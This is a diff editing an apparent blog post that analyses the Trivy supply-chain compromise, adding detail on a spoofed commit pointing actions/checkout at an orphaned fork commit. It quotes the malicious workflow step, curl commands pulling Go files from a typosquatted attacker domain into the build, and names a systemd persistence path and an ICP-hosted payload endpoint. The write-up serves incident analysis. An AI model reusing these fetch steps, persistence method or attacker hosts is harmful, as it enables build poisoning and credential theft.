@@ -20,7 +20,7 @@ Two days of infrastructure prep. Then the real work began.
 
 According to [Wiz's research](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack), the group behind this (calling themselves "TeamPCP") had compromised the `aqua-bot` service account through residual access from an earlier incident in March 2026 that was never fully contained. With that access, they didn't just tamper with one tag. They force-pushed 75 of 76 `trivy-action` tags and 7 `setup-trivy` tags to malicious commits. The `0.34.2` tag caused the most damage in the wild because so many organizations had already adopted it as a legitimate upgrade.
 
-On March 19 around 17:43 UTC, the attacker moved the `0.34.2` tag. It had pointed to a clean commit; now it resolved to a different one (`ddb9da44`) that looked nearly identical to the original. Same author name, same timestamp, same commit message. The attacker had spoofed the commit metadata to impersonate legitimate Aqua developers (Wiz identified the handles `rauchg` and `DmitriyLewen`). The only differences were the parent chain (it branched off `v0.35.0` instead of sitting on the main branch) and the contents of `entrypoint.sh`, which now had 105 lines of malicious code prepended to the legitimate Trivy logic.
+On March 19 around 17:43 UTC, the attacker moved the `0.34.2` tag. It had pointed to a clean commit; now it resolved to a different one (`ddb9da44`) that looked nearly identical to the original. Same author name, same timestamp, same commit message. The attacker had spoofed the commit metadata to impersonate known developers. `DmitriyLewen` is a legitimate Aqua Security engineer. `rauchg` is Guillermo Rauch, the CEO of Vercel, who has nothing to do with Aqua Security but whose name on a commit touching GitHub Actions plumbing wouldn't raise an eyebrow. The only differences were the parent chain (it branched off `v0.35.0` instead of sitting on the main branch) and the contents of `entrypoint.sh`, which now had 105 lines of malicious code prepended to the legitimate Trivy logic.
 
 This is the fundamental problem with Git tags: they're just pointers. You can move them whenever you want, and anyone pulling that tag gets whatever it points to now, not what it pointed to yesterday. Every organization that had already pinned to `0.34.2` silently started pulling the attacker's code with no change on their end.
 
@@ -178,7 +178,40 @@ Finally, cleanup. The temp directory, key files, and collection file all get del
 
 ## It Didn't Stop at CI
 
-This is where Wiz's analysis adds a critical piece that isn't visible from the GitHub Actions side alone. The malicious `v0.69.4` trivy binary (not just the action, but the compiled CLI itself) had a second mode. When it detected it was running outside of GitHub Actions (`GITHUB_ACTIONS != "true"`), it dropped a Python script to `~/.config/systemd/user/sysmon.py` and created a systemd user unit to run it persistently. That script polled `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io` (an ICP-hosted endpoint) every five minutes, downloading and executing whatever payload it received.
+Everything above describes the `trivy-action` shell script side. The binary side was a separate operation, and it started two weeks earlier.
+
+On March 4, [commit `1885610c`](https://github.com/aquasecurity/trivy/commit/1885610c6a34811c8296416ae69f568002ef11ec) landed in `aquasecurity/trivy` with the message `fix(ci): Use correct checkout pinning`, attributed to `DmitriyLewen`. The diff touched two workflow files across 14 lines, and most of it was noise: single quotes swapped for double quotes, a trailing space removed from a `mkdir` line. The kind of commit that passes review because there's nothing to review.
+
+Two lines mattered. The first swapped the `actions/checkout` SHA in the release workflow:
+
+```diff
+-        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
++        uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2
+```
+
+The `# v6.0.2` comment stayed. The SHA changed. The second added `--skip=validate` to the GoReleaser invocation, telling it not to run integrity checks on the build artifacts.
+
+The payload lived at the other end of that SHA. [Commit `70379aad`](https://github.com/actions/checkout/commit/70379aad1a8b40919ce8b382d3cd7d0315cde1d0) sits in the `actions/checkout` repository as an orphaned commit. GitHub's UI flags it with a yellow banner: *"This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository."* The attacker created it in a fork of `actions/checkout`, but GitHub's architecture makes fork commits reachable by SHA from the parent repo. The author is listed as `Guillermo Rauch <rauchg@gmail.com>` (spoofed, again), the commit message references [PR #2356](https://github.com/actions/checkout/pull/2356) (a real, closed pull request by a GitHub employee), and the commit is unsigned. Everything about it is designed to look routine if you only glance at the metadata.
+
+The diff replaced `action.yml`'s Node.js entrypoint with a composite action. The composite action performs a legitimate checkout via the parent commit, then silently overwrites the Trivy source tree:
+
+```yaml
+   - name: "Setup Checkout"
+     shell: bash
+     run: |
+       BASE="https://scan.aquasecurtiy.org/static"
+       curl -sf "$BASE/main.go" -o cmd/trivy/main.go &> /dev/null
+       curl -sf "$BASE/scand.go" -o cmd/trivy/scand.go &> /dev/null
+       curl -sf "$BASE/fork_unix.go" -o cmd/trivy/fork_unix.go &> /dev/null
+       curl -sf "$BASE/fork_windows.go" -o cmd/trivy/fork_windows.go &> /dev/null
+       curl -sf "$BASE/.golangci.yaml" -o .golangci.yaml &> /dev/null
+```
+
+Four Go files pulled from the same typosquatted C2 and dropped into `cmd/trivy/`, replacing the legitimate source. A fifth download replaced `.golangci.yaml` to disable linter rules that would have flagged the injected code. The C2 is no longer serving these files, so the exact contents can't be independently verified, but the file names and Wiz's behavioral analysis of the compiled binary tell the story: `main.go` bootstrapped the malware before the real scanner, `scand.go` carried the credential-stealing logic, and `fork_unix.go`/`fork_windows.go` handled platform-specific persistence.
+
+When GoReleaser ran with validation skipped, it built binaries from this poisoned source and published them as `v0.69.4` through Trivy's own release infrastructure. No runtime download, no shell script, no base64. The malware was compiled in.
+
+The malicious binary had a second mode. When it detected it was running outside of GitHub Actions (`GITHUB_ACTIONS != "true"`), it dropped a Python script to `~/.config/systemd/user/sysmon.py` and created a systemd user unit to run it persistently. That script polled `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io` (an ICP-hosted endpoint) every five minutes, downloading and executing whatever payload it received.
 
 In other words: if a developer ran the compromised trivy binary locally (not in CI), they got a persistent backdoor installed on their workstation. The CI credential theft was the loud part of the attack. The quiet part was long-term access to developer machines.
 
